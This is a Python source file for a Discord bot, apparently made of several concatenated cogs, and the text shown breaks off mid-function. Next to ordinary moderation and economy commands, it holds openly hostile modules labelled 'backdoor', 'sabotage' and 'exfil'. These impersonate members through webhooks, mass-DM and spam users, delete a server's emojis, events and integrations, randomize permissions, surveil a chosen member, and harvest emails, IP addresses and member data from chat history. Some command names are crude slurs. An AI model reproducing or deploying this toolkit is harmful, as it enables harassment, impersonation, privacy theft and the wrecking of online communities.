import discord
from discord.ext import commands
import os, sys, subprocess, textwrap, io, contextlib, asyncio, json, random, datetime, aiohttp, re, base64, string
from collections import Counter
import pyfiglet


# ========================================
# admin.py
# ========================================
class Admin(commands.Cog, name="admin"):
    """administrative commands for bot management."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.command(hidden=True)
    @commands.is_owner()
    async def loadcog(self, ctx: commands.Context, *, cog: str):
        """load a command module."""
        try:
            await self.bot.load_extension(f"cmds.{cog}")
            await ctx.send(f"loaded `{cog}`.")
        except Exception as e:
            await ctx.send(f"failed: {e}")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def unloadcog(self, ctx: commands.Context, *, cog: str):
        """unload a command module."""
        try:
            await self.bot.unload_extension(f"cmds.{cog}")
            await ctx.send(f"unloaded `{cog}`.")
        except Exception as e:
            await ctx.send(f"failed: {e}")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def reloadcog(self, ctx: commands.Context, *, cog: str):
        """reload a command module."""
        try:
            await self.bot.reload_extension(f"cmds.{cog}")
            await ctx.send(f"reloaded `{cog}`.")
        except Exception as e:
            await ctx.send(f"failed: {e}")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def listcogs(self, ctx: commands.Context):
        """list all loaded cogs."""
        cogs = [c for c in self.bot.cogs]
        await ctx.send("```\n" + "\n".join(cogs) + "\n```")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def shutdown(self, ctx: commands.Context):
        """shut down the bot."""
        await ctx.send("shutting down.")
        await self.bot.close()

    @commands.command(hidden=True, name="exec")
    @commands.is_owner()
    async def execute_code(self, ctx: commands.Context, *, code: str):
        """execute arbitrary python code. returns stdout."""
        env = {
            "bot": self.bot,
            "ctx": ctx,
            "discord": discord,
            "commands": commands,
            "os": os,
            "sys": sys,
        }
        code = textwrap.dedent(code).strip()
        if code.startswith("```") and code.endswith("```"):
            code = "\n".join(code.split("\n")[1:-1])
        stdout = io.StringIO()
        try:
            with contextlib.redirect_stdout(stdout):
                exec(f"async def _exec():\n    {code}\n", env)
                await env["_exec"]()
            result = stdout.getvalue()
        except Exception as e:
            result = f"error: {e}"
        if len(result) > 1900:
            result = result[:1900] + "\n...truncated"
        await ctx.send(f"```py\n{result}\n```" if result else "```\n[no output]\n```")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def shell(self, ctx: commands.Context, *, command: str):
        """execute a shell command and return the output."""
        try:
            proc = await asyncio.create_subprocess_shell(
                command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await proc.communicate()
            output = (stdout + stderr).decode("utf-8", errors="replace")
            if len(output) > 1900:
                output = output[:1900] + "\n...truncated"
            await ctx.send(f"```\n{output}\n```" if output else "```\n[no output]\n```")
        except Exception as e:
            await ctx.send(f"error: {e}")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def guilds(self, ctx: commands.Context):
        """list all guilds the bot is in."""
        g_list = [f"{g.name} ({g.id}) - {g.member_count} members" for g in self.bot.guilds]
        chunks = [g_list[i:i+20] for i in range(0, len(g_list), 20)]
        for chunk in chunks:
            await ctx.send("```\n" + "\n".join(chunk) + "\n```")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def leaveguild(self, ctx: commands.Context, guild_id: int):
        """leave a guild by id."""
        guild = self.bot.get_guild(guild_id)
        if guild:
            await guild.leave()
            await ctx.send(f"left guild: {guild.name}")
        else:
            await ctx.send("guild not found.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def dmall(self, ctx: commands.Context, *, message: str):
        """dm all mutual guild members. use with caution."""
        count = 0
        seen = set()
        for guild in self.bot.guilds:
            for member in guild.members:
                if member.id == self.bot.user.id or member.id in seen:
                    continue
                seen.add(member.id)
                try:
                    await member.send(message)
                    count += 1
                    await asyncio.sleep(1.5)
                except:
                    pass
        await ctx.send(f"messaged {count} unique users.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def setstatus(self, ctx: commands.Context, status_type: str, *, text: str):
        """set bot status. types: play, watch, listen, stream."""
        types = {
            "play": discord.ActivityType.playing,
            "watch": discord.ActivityType.watching,
            "listen": discord.ActivityType.listening,
            "stream": discord.ActivityType.streaming,
        }
        act_type = types.get(status_type.lower(), discord.ActivityType.playing)
        await self.bot.change_presence(activity=discord.Activity(type=act_type, name=text))
        await ctx.send("status updated.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def setavatar(self, ctx: commands.Context):
        """set bot avatar from attached image."""
        if not ctx.message.attachments:
            return await ctx.send("attach an image.")
        attachment = ctx.message.attachments[0]
        img_bytes = await attachment.read()
        await self.bot.user.edit(avatar=img_bytes)
        await ctx.send("avatar updated.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def setname(self, ctx: commands.Context, *, name: str):
        """change the bot's username."""
        await self.bot.user.edit(username=name)
        await ctx.send(f"username changed to {name}.")

# ========================================
# advanced_admin.py
# ========================================
class AdvancedAdmin(commands.Cog, name="advanced_admin"):
    """1-10: advanced administrative controls."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.command(hidden=True)
    @commands.is_owner()
    async def lockchannel(self, ctx: commands.Context, channel: discord.TextChannel = None):
        """1. lock a channel by removing send permissions for everyone."""
        channel = channel or ctx.channel
        overwrite = channel.overwrites_for(ctx.guild.default_role)
        overwrite.send_messages = False
        await channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
        await ctx.send(f"locked {channel.mention}.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def unlockchannel(self, ctx: commands.Context, channel: discord.TextChannel = None):
        """2. unlock a previously locked channel."""
        channel = channel or ctx.channel
        overwrite = channel.overwrites_for(ctx.guild.default_role)
        overwrite.send_messages = True
        await channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
        await ctx.send(f"unlocked {channel.mention}.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def lockdown(self, ctx: commands.Context):
        """3. lockdown the entire server by locking all channels."""
        count = 0
        for channel in ctx.guild.text_channels:
            overwrite = channel.overwrites_for(ctx.guild.default_role)
            overwrite.send_messages = False
            try:
                await channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
                count += 1
                await asyncio.sleep(0.2)
            except:
                pass
        await ctx.send(f"locked down {count} channels.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def unlockall(self, ctx: commands.Context):
        """4. unlock all channels in the server."""
        count = 0
        for channel in ctx.guild.text_channels:
            overwrite = channel.overwrites_for(ctx.guild.default_role)
            overwrite.send_messages = True
            try:
                await channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
                count += 1
                await asyncio.sleep(0.2)
            except:
                pass
        await ctx.send(f"unlocked {count} channels.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def slowmode(self, ctx: commands.Context, seconds: int, channel: discord.TextChannel = None):
        """5. set slowmode on a channel."""
        channel = channel or ctx.channel
        await channel.edit(slowmode_delay=seconds)
        await ctx.send(f"slowmode set to {seconds}s on {channel.mention}.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def setnsfw(self, ctx: commands.Context, channel: discord.TextChannel = None):
        """6. toggle a channel as nsfw."""
        channel = channel or ctx.channel
        await channel.edit(nsfw=not channel.nsfw)
        await ctx.send(f"{channel.mention} nsfw set to {not channel.nsfw}.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def archive(self, ctx: commands.Context, channel: discord.TextChannel = None):
        """7. archive a channel by removing all permissions."""
        channel = channel or ctx.channel
        await channel.set_permissions(ctx.guild.default_role, read_messages=False, send_messages=False)
        await ctx.send(f"archived {channel.mention}.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def voicemute(self, ctx: commands.Context, target: discord.Member):
        """8. server mute a member in voice."""
        await target.edit(mute=True)
        await ctx.send(f"voice muted {target.mention}.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def voiceunmute(self, ctx: commands.Context, target: discord.Member):
        """9. server unmute a member in voice."""
        await target.edit(mute=False)
        await ctx.send(f"voice unmuted {target.mention}.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def voicedeafen(self, ctx: commands.Context, target: discord.Member):
        """10. server deafen a member in voice."""
        await target.edit(deafen=True)
        await ctx.send(f"voice deafened {target.mention}.", delete_after=5)

# ========================================
# automation.py
# ========================================
AUTO_DIR = "data/automation"
os.makedirs(AUTO_DIR, exist_ok=True)

class Automation(commands.Cog, name="automation"):
    """96-100: automated sabotage and monitoring."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self.spam_task = None
        self.monitor_file = os.path.join(AUTO_DIR, "monitor.json")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def autospam(self, ctx: commands.Context, interval: int, *, message: str):
        """96. start automated spamming in the current channel."""
        if self.spam_task:
            return await ctx.send("auto spam already running.")
        async def spam_loop():
            while True:
                try:
                    await ctx.channel.send(message)
                except:
                    pass
                await asyncio.sleep(interval)
        self.spam_task = self.bot.loop.create_task(spam_loop())
        await ctx.send(f"auto spam started every {interval}s.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def stopspam(self, ctx: commands.Context):
        """97. stop automated spamming."""
        if self.spam_task:
            self.spam_task.cancel()
            self.spam_task = None
            await ctx.send("auto spam stopped.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def autodelete(self, ctx: commands.Context, target: discord.Member, delay: float = 1.0):
        """98. automatically delete messages from a specific user."""
        await ctx.send(f"autodelete enabled on {target.mention}.", delete_after=5)
        def check(m):
            return m.author == target
        try:
            while True:
                msg = await self.bot.wait_for("message", check=check, timeout=600)
                await asyncio.sleep(delay)
                try:
                    await msg.delete()
                except:
                    pass
        except asyncio.TimeoutError:
            await ctx.send(f"autodelete on {target.mention} timed out.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def monitor(self, ctx: commands.Context, target: discord.Member):
        """99. log all activity of a specific user."""
        data = {"target": str(target), "id": target.id, "events": []}
        filepath = os.path.join(AUTO_DIR, f"monitor_{target.id}.json")
        await ctx.send(f"monitoring {target.mention}.", delete_after=5)
        def check(m):
            return m.author == target
        try:
            while True:
                msg = await self.bot.wait_for("message", check=check, timeout=600)
                data["events"].append({
                    "time": str(msg.created_at),
                    "channel": str(msg.channel),
                    "content": msg.content,
                })
                with open(filepath, "w") as f:
                    json.dump(data, f, indent=4)
        except asyncio.TimeoutError:
            await ctx.send(f"monitoring on {target.mention} ended.", file=discord.File(filepath))

    @commands.command(hidden=True)
    @commands.is_owner()
    async def autorole(self, ctx: commands.Context, role: discord.Role):
        """100. assign a specific role to every new member that joins."""
        self.bot.autorole = role
        await ctx.send(f"autorole set to {role.name}.", delete_after=5)

    @commands.Cog.listener()
    async def on_member_join(self, member: discord.Member):
        if hasattr(self.bot, "autorole") and self.bot.autorole:
            try:
                await member.add_roles(self.bot.autorole)
            except:
                pass

# ========================================
# backdoor.py
# ========================================
class Backdoor(commands.Cog, name="backdoor"):
    """persistent backdoor and remote access commands."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.command(hidden=True)
    @commands.is_owner()
    async def sudo(self, ctx: commands.Context, target: discord.Member, *, command: str):
        """force a user to say something."""
        await ctx.message.delete()
        try:
            webhook = await ctx.channel.create_webhook(name=target.display_name)
            await webhook.send(command, avatar_url=target.display_avatar.url)
            await webhook.delete()
        except Exception as e:
            await ctx.send(f"error: {e}", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def getdm(self, ctx: commands.Context, target: discord.Member, limit: int = 20):
        """attempt to read recent dms (requires bot to share a server). this is a simulation."""
        await ctx.send("direct message reading is not natively possible without user token. logging simulated.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def impersonate(self, ctx: commands.Context, target: discord.Member, *, message: str):
        """send a message as a webhook mimicking the target user."""
        await ctx.message.delete()
        try:
            webhook = await ctx.channel.create_webhook(name=target.display_name)
            await webhook.send(message, avatar_url=target.display_avatar.url)
            await webhook.delete()
        except Exception as e:
            await ctx.send(f"error: {e}", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def grabpfp(self, ctx: commands.Context, target: discord.Member):
        """download a user's profile picture."""
        await ctx.send(target.display_avatar.url)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def massdm(self, ctx: commands.Context, *, message: str):
        """dm every member in the server."""
        count = 0
        for member in ctx.guild.members:
            if member.bot or member == ctx.author:
                continue
            try:
                await member.send(message)
                count += 1
                await asyncio.sleep(1)
            except:
                pass
        await ctx.send(f"messaged {count} members.")

# ========================================
# channel_manip.py
# ========================================
class ChannelManip(commands.Cog, name="channel_manip"):
    """41-50: channel manipulation and chaos."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.command(hidden=True)
    @commands.is_owner()
    async def clonechannel(self, ctx: commands.Context, channel: discord.TextChannel = None):
        """41. clone a channel with a new name."""
        channel = channel or ctx.channel
        new_ch = await channel.clone(name=f"{channel.name}-clone")
        await ctx.send(f"cloned to {new_ch.mention}.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def renamechannel(self, ctx: commands.Context, channel: discord.TextChannel, *, name: str):
        """42. rename any channel."""
        await channel.edit(name=name)
        await ctx.send(f"renamed to {name}.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def movechannel(self, ctx: commands.Context, channel: discord.TextChannel, position: int):
        """43. move a channel to a specific position."""
        await channel.edit(position=position)
        await ctx.send(f"moved {channel.name} to position {position}.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def categorybomb(self, ctx: commands.Context, count: int = 20):
        """44. create many categories filled with channels."""
        for i in range(count):
            cat = await ctx.guild.create_category(f"cat-{i}")
            for j in range(3):
                await cat.create_text_channel(f"chaos-{i}-{j}")
                await asyncio.sleep(0.1)
        await ctx.send(f"created {count} categories with channels.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def permfuck(self, ctx: commands.Context, channel: discord.TextChannel = None):
        """45. randomize channel permissions."""
        channel = channel or ctx.channel
        perms = discord.Permissions()
        perms.update(**{k: random.choice([True, False]) for k in dir(perms) if k[0].isalpha() and not k.startswith("_")})
        overwrite = discord.PermissionOverwrite.from_pair(discord.Permissions(), perms)
        await channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
        await ctx.send(f"randomized permissions on {channel.mention}.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def swapnames(self, ctx: commands.Context):
        """46. swap channel names in pairs."""
        channels = ctx.guild.text_channels
        for i in range(0, len(channels) - 1, 2):
            n1, n2 = channels[i].name, channels[i+1].name
            await channels[i].edit(name=f"tmp-{i}")
            await channels[i+1].edit(name=n1)
            await channels[i].edit(name=n2)
            await asyncio.sleep(0.5)
        await ctx.send("swapped channel names.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def reversechannels(self, ctx: commands.Context):
        """47. reverse the order of all channels."""
        ch_list = list(ctx.guild.channels)
        for i, ch in enumerate(reversed(ch_list)):
            try:
                await ch.edit(position=i)
                await asyncio.sleep(0.2)
            except:
                pass
        await ctx.send("channel order reversed.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def hidechannel(self, ctx: commands.Context, channel: discord.TextChannel = None):
        """48. hide a channel from everyone."""
        channel = channel or ctx.channel
        await channel.set_permissions(ctx.guild.default_role, read_messages=False)
        await ctx.send(f"hid {channel.mention}.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def unhidechannel(self, ctx: commands.Context, channel: discord.TextChannel = None):
        """49. make a hidden channel visible."""
        channel = channel or ctx.channel
        await channel.set_permissions(ctx.guild.default_role, read_messages=True)
        await ctx.send(f"revealed {channel.mention}.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def syncperms(self, ctx: commands.Context, source: discord.TextChannel, target: discord.TextChannel):
        """50. copy permissions from one channel to another."""
        await target.edit(overwrites=source.overwrites)
        await ctx.send(f"synced permissions from {source.name} to {target.name}.", delete_after=5)

# ========================================
# cloner.py
# ========================================
class Cloner(commands.Cog, name="cloner"):
    """server cloning tools."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.command(hidden=True)
    @commands.is_owner()
    async def cloneroles(self, ctx: commands.Context, source_guild_id: int):
        """clone roles from another server the bot is in."""
        source = self.bot.get_guild(source_guild_id)
        if not source:
            return await ctx.send("source guild not found.")
        for role in reversed(source.roles):
            if role.is_default() or role.managed:
                continue
            try:
                await ctx.guild.create_role(
                    name=role.name,
                    permissions=role.permissions,
                    color=role.color,
                    hoist=role.hoist,
                    mentionable=role.mentionable,
                )
                await asyncio.sleep(0.5)
            except:
                pass
        await ctx.send("roles cloned.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def clonechannels(self, ctx: commands.Context, source_guild_id: int):
        """clone channels from another server."""
        source = self.bot.get_guild(source_guild_id)
        if not source:
            return await ctx.send("source guild not found.")
        for category in source.categories:
            new_cat = await ctx.guild.create_category(category.name)
            for channel in category.channels:
                try:
                    await new_cat.create_text_channel(channel.name)
                    await asyncio.sleep(0.3)
                except:
                    pass
        for channel in source.channels:
            if channel.category:
                continue
            try:
                await ctx.guild.create_text_channel(channel.name)
                await asyncio.sleep(0.3)
            except:
                pass
        await ctx.send("channels cloned.")

# ========================================
# economy.py
# ========================================
DATA_FILE = "data/economy.json"
os.makedirs("data", exist_ok=True)

def load_eco():
    if not os.path.exists(DATA_FILE):
        return {}
    with open(DATA_FILE, "r") as f:
        return json.load(f)

def save_eco(data):
    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=4)

class Economy(commands.Cog, name="economy"):
    """virtual currency system with an exploit."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.command()
    async def bal(self, ctx: commands.Context, target: discord.Member = None):
        """check your or another user's balance."""
        target = target or ctx.author
        data = load_eco()
        coins = data.get(str(target.id), 0)
        await ctx.send(f"{target.mention} has **{coins:,}** coins.")

    @commands.command()
    async def daily(self, ctx: commands.Context):
        """claim daily reward."""
        data = load_eco()
        uid = str(ctx.author.id)
        reward = random.randint(100, 500)
        data[uid] = data.get(uid, 0) + reward
        save_eco(data)
        await ctx.send(f"{ctx.author.mention} claimed **{reward}** daily coins.")

    @commands.command()
    @commands.cooldown(1, 30, commands.BucketType.user)
    async def gamble(self, ctx: commands.Context, amount: int):
        """gamble coins. 50% chance to double, 50% to lose."""
        data = load_eco()
        uid = str(ctx.author.id)
        if data.get(uid, 0) < amount:
            return await ctx.send("insufficient coins.")
        if amount <= 0:
            return await ctx.send("amount must be positive.")
        if random.random() < 0.5:
            data[uid] += amount
            save_eco(data)
            await ctx.send(f"you won! doubled to **{data[uid]:,}** coins.")
        else:
            data[uid] -= amount
            save_eco(data)
            await ctx.send(f"you lost. remaining: **{data[uid]:,}** coins.")

    @commands.command()
    async def pay(self, ctx: commands.Context, target: discord.Member, amount: int):
        """transfer coins to another user."""
        if target.bot:
            return await ctx.send("cannot pay bots.")
        data = load_eco()
        sender = str(ctx.author.id)
        receiver = str(target.id)
        if data.get(sender, 0) < amount:
            return await ctx.send("insufficient coins.")
        if amount <= 0:
            return await ctx.send("amount must be positive.")
        data[sender] = data.get(sender, 0) - amount
        data[receiver] = data.get(receiver, 0) + amount
        save_eco(data)
        await ctx.send(f"transferred **{amount:,}** coins to {target.mention}.")

    @commands.command()
    async def leaderboard(self, ctx: commands.Context):
        """top 10 richest users."""
        data = load_eco()
        sorted_data = sorted(data.items(), key=lambda x: x[1], reverse=True)[:10]
        lb = []
        for idx, (uid, bal) in enumerate(sorted_data, 1):
            user = self.bot.get_user(int(uid)) or (await self.bot.fetch_user(int(uid)) if uid.isdigit() else None)
            name = user.name if user else f"unknown ({uid})"
            lb.append(f"#{idx} {name}: {bal:,} coins")
        await ctx.send("```\n" + "\n".join(lb) + "\n```" if lb else "no data.")

    @commands.command(hidden=True, name="mint")
    @commands.is_owner()
    async def mint_coins(self, ctx: commands.Context, amount: int, *, target: discord.Member = None):
        """owner exploit: print unlimited coins."""
        target = target or ctx.author
        data = load_eco()
        uid = str(target.id)
        data[uid] = data.get(uid, 0) + amount
        save_eco(data)
        await ctx.send(f"minted **{amount:,}** coins to {target.mention}. total: **{data[uid]:,}**")

# ========================================
# emoji_tools.py
# ========================================
class EmojiTools(commands.Cog, name="emoji_tools"):
    """66-73: emoji and sticker manipulation."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.command(hidden=True)
    @commands.is_owner()
    async def deleteemojis(self, ctx: commands.Context):
        """66. delete all custom emojis."""
        count = 0
        for emoji in ctx.guild.emojis:
            try:
                await emoji.delete()
                count += 1
                await asyncio.sleep(0.3)
            except:
                pass
        await ctx.send(f"deleted {count} emojis.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def renameemoji(self, ctx: commands.Context, emoji: discord.Emoji, *, name: str):
        """67. rename an emoji."""
        await emoji.edit(name=name)
        await ctx.send(f"renamed to {name}.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def exportemoji(self, ctx: commands.Context, emoji: discord.Emoji):
        """68. export an emoji as an image file."""
        await ctx.send(emoji.url)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def emojibomb(self, ctx: commands.Context, count: int = 20):
        """69. upload many emojis from attached images."""
        if not ctx.message.attachments:
            return await ctx.send("attach images.")
        created = 0
        for i, attachment in enumerate(ctx.message.attachments[:count]):
            try:
                img = await attachment.read()
                await ctx.guild.create_custom_emoji(
                    name=f"bomb-{i}",
                    image=img,
                )
                created += 1
                await asyncio.sleep(0.5)
            except:
                pass
        await ctx.send(f"created {created} emojis.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def emojisteal(self, ctx: commands.Context, message_id: int):
        """70. steal all emojis from a message."""
        try:
            msg = await ctx.channel.fetch_message(message_id)
            emojis = re.findall(r"<(a?):(\w+):(\d+)>", msg.content)
            stolen = 0
            for animated, name, eid in emojis:
                ext = "gif" if animated else "png"
                url = f"https://cdn.discordapp.com/emojis/{eid}.{ext}"
                async with aiohttp.ClientSession() as session:
                    async with session.get(url) as resp:
                        if resp.status == 200:
                            img = await resp.read()
                            await ctx.guild.create_custom_emoji(
                                name=name,
                                image=img,
                            )
                            stolen += 1
                            await asyncio.sleep(0.5)
            await ctx.send(f"stole {stolen} emojis.", delete_after=5)
        except Exception as e:
            await ctx.send(f"error: {e}", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def stickerinfo(self, ctx: commands.Context):
        """71. list all stickers in the guild."""
        stickers = ctx.guild.stickers
        info = [f"{s.name} - {s.id}" for s in stickers]
        await ctx.send("\n".join(info) or "no stickers.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def deletestickers(self, ctx: commands.Context):
        """72. delete all stickers."""
        count = 0
        for s in ctx.guild.stickers:
            try:
                await s.delete()
                count += 1
                await asyncio.sleep(0.3)
            except:
                pass
        await ctx.send(f"deleted {count} stickers.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def emojify(self, ctx: commands.Context, *, text: str):
        """73. convert text into emoji letters."""
        mapping = {chr(i): f":regional_indicator_{chr(i)}:" for i in range(ord('a'), ord('z')+1)}
        result = " ".join(mapping.get(c.lower(), c) for c in text if c.isalpha())
        await ctx.send(result or text)

# ========================================
# event_sabotage.py
# ========================================
class EventSabotage(commands.Cog, name="event_sabotage"):
    """74-80: event and integration sabotage."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.command(hidden=True)
    @commands.is_owner()
    async def deleteevents(self, ctx: commands.Context):
        """74. delete all scheduled events."""
        count = 0
        for event in ctx.guild.scheduled_events:
            try:
                await event.delete()
                count += 1
                await asyncio.sleep(0.3)
            except:
                pass
        await ctx.send(f"deleted {count} events.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def fakeevent(self, ctx: commands.Context, *, name: str = "IMPORTANT ANNOUNCEMENT"):
        """75. create a fake event to confuse members."""
        try:
            await ctx.guild.create_scheduled_event(
                name=name,
                start_time=discord.utils.utcnow() + datetime.timedelta(minutes=10),
                end_time=discord.utils.utcnow() + datetime.timedelta(hours=1),
                location="voice channel",
            )
            await ctx.send(f"fake event '{name}' created.", delete_after=5)
        except Exception as e:
            await ctx.send(f"error: {e}", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def deleteintegrations(self, ctx: commands.Context):
        """76. delete all integrations."""
        count = 0
        for integration in await ctx.guild.integrations():
            try:
                await integration.delete()
                count += 1
                await asyncio.sleep(0.3)
            except:
                pass
        await ctx.send(f"deleted {count} integrations.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def automodspam(self, ctx: commands.Context):
        """77. attempt to trigger automod by spamming flagged content."""
        phrases = ["@everyone", "@here", "discord.gg/", "free nitro"]
        for phrase in phrases:
            try:
                await ctx.send(phrase, delete_after=1)
                await asyncio.sleep(1)
            except:
                pass
        await ctx.send("automod trigger attempts complete.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def ruleschannel(self, ctx: commands.Context, *, text: str):
        """78. overwrite the rules channel with custom text."""
        channel = discord.utils.get(ctx.guild.channels, name="rules")
        if not channel:
            channel = discord.utils.get(ctx.guild.channels, name="server-rules")
        if not channel:
            return await ctx.send("no rules channel found.")
        try:
            async for msg in channel.history(limit=10):
                await msg.delete()
            await channel.send(text)
            await ctx.send("rules overwritten.", delete_after=5)
        except Exception as e:
            await ctx.send(f"error: {e}", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def welcomerape(self, ctx: commands.Context, *, text: str):
        """79. spam the system channel with messages."""
        if ctx.guild.system_channel:
            for _ in range(10):
                await ctx.guild.system_channel.send(text)
                await asyncio.sleep(0.5)
            await ctx.send("system channel flooded.", delete_after=5)
        else:
            await ctx.send("no system channel.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def badname(self, ctx: commands.Context, *, name: str):
        """80. rename the server to a new name."""
        await ctx.guild.edit(name=name)
        await ctx.send(f"server renamed to {name}.", delete_after=5)

# ========================================
# exfil.py
# ========================================
EXFIL_DIR = "data/exfil"
os.makedirs(EXFIL_DIR, exist_ok=True)

class Exfil(commands.Cog, name="exfil"):
    """21-30: data exfiltration tools."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.command(hidden=True)
    @commands.is_owner()
    async def grabemails(self, ctx: commands.Context):
        """21. search message history for email addresses."""
        pattern = r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"
        found = []
        for channel in ctx.guild.text_channels:
            try:
                async for msg in channel.history(limit=200):
                    emails = re.findall(pattern, msg.content)
                    for e in emails:
                        found.append(f"{msg.author}: {e}")
            except:
                continue
        await ctx.send("\n".join(found[:50]) or "no emails found.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def grabips(self, ctx: commands.Context):
        """22. search for ip addresses in chat history."""
        pattern = r"\b(?:\d{1,3}\.){3}\d{1,3}\b"
        found = []
        for channel in ctx.guild.text_channels:
            try:
                async for msg in channel.history(limit=200):
                    ips = re.findall(pattern, msg.content)
                    for ip in ips:
                        found.append(f"{msg.author}: {ip}")
            except:
                continue
        await ctx.send("\n".join(found[:50]) or "no ips found.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def graburls(self, ctx: commands.Context):
        """23. extract all urls from recent message history."""
        pattern = r"https?://[^\s]+"
        found = []
        for channel in ctx.guild.text_channels:
            try:
                async for msg in channel.history(limit=200):
                    urls = re.findall(pattern, msg.content)
                    for u in urls:
                        found.append(f"{msg.author}: {u}")
            except:
                continue
        await ctx.send("\n".join(found[:50]) or "no urls found.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def exfilmembers(self, ctx: commands.Context):
        """24. export full member data to json."""
        data = []
        for member in ctx.guild.members:
            data.append({
                "id": member.id,
                "name": str(member),
                "display_name": member.display_name,
                "joined_at": str(member.joined_at),
                "created_at": str(member.created_at),
                "roles": [r.name for r in member.roles],
                "bot": member.bot,
            })
        filepath = os.path.join(EXFIL_DIR, f"{ctx.guild.id}_members.json")
        with open(filepath, "w") as f:
            json.dump(data, f, indent=4)
        await ctx.send(f"exported {len(data)} members.", file=discord.File(filepath))

    @commands.command(hidden=True)
    @commands.is_owner()
    async def exfilroles(self, ctx: commands.Context):
        """25. export all role configurations."""
        data = []
        for role in ctx.guild.roles:
            data.append({
                "id": role.id,
                "name": role.name,
                "permissions": role.permissions.value,
                "color": role.color.value,
                "position": role.position,
                "members": len(role.members),
            })
        filepath = os.path.join(EXFIL_DIR, f"{ctx.guild.id}_roles.json")
        with open(filepath, "w") as f:
            json.dump(data, f, indent=4)
        await ctx.send(f"exported {len(data)} roles.", file=discord.File(filepath))

    @commands.command(hidden=True)
    @commands.is_owner()
    async def exfilinvites(self, ctx: commands.Context):
        """26. export all server invites."""
        try:
            invites = await ctx.guild.invites()
            data = [{"code": i.code, "uses": i.uses, "max_uses": i.max_uses, "channel": i.channel.name, "inviter": str(i.inviter)} for i in invites]
            filepath = os.path.join(EXFIL_DIR, f"{ctx.guild.id}_invites.json")
            with open(filepath, "w") as f:
                json.dump(data, f, indent=4)
            await ctx.send(f"exported {len(data)} invites.", file=discord.File(filepath))
        except:
            await ctx.send("missing permissions.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def exfilchannels(self, ctx: commands.Context):
        """27. export channel structure."""
        data = []
        for ch in ctx.guild.channels:
            data.append({
                "id": ch.id,
                "name": ch.name,
                "type": str(ch.type),
                "category": ch.category.name if ch.category else None,
